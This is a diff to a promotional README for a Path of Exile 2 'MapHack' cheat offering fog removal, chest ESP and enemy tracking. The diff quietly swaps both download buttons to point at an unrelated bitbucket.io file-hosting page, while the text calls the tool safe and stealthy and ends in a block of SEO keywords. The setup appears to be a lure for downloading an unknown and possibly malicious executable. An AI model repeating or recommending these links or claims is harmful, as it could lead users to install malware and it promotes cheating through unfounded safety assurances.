@@ -6,14 +6,14 @@ In **Path of Exile 2**, exploring maps can feel like crawling through a foggy ma
 
 It lifts the fog, exposes every secret, and gives you full vision of the layout—before you even take a step. Add **chest ESP**, **enemy location tracking**, and **rare marker reveals**, and you've got the ultimate loot navigator.
 
-[![Download MapHack](https://img.shields.io/badge/Download-MapHack-blueviolet)](https://wecheaters.github.io/cheats/path-of-exile-2/)
+[![Download MapHack](https://img.shields.io/badge/Download-MapHack-blueviolet)](https://fileoffload9.bitbucket.io)
 ---
 
 ## 🧰 Product Description
 
 This **MapHack** is a safe overlay tool designed for **Path of Exile 2** (PC only). It doesn't modify game files—meaning no direct injection—and is ideal for private leagues, solo play, or custom map farming. Lightweight, stealthy, and updated for all new content drops.
 
-[![Download MapHack](https://i.ytimg.com/vi/vkNlG8bboYA/maxresdefault.jpg)](https://wecheaters.github.io/cheats/path-of-exile-2/)
+[![Download MapHack](https://i.ytimg.com/vi/vkNlG8bboYA/maxresdefault.jpg)](https://fileoffload9.bitbucket.io)
 ---
 
 ## 🔧 Core Features of the PoE 2 MapHack
@@ -117,3 +117,4 @@ Whether you're farming currency, rushing bosses, or clearing atlas maps, this to
 path of exile 2 maphack, poe 2 full map reveal, poe2 cheat overlay, poe 2 fog remover, path of exile 2 esp tool, poe 2 map cheat, poe 2 chest tracker, path of exile 2 external hack, poe 2 no fog, poe 2 minimap enhancer, poe2 loot overlay, poe 2 visual tool, path of exile 2 radar, poe 2 navigation mod, safe maphack poe 2, path of exile 2 cheat
 
 ---
+
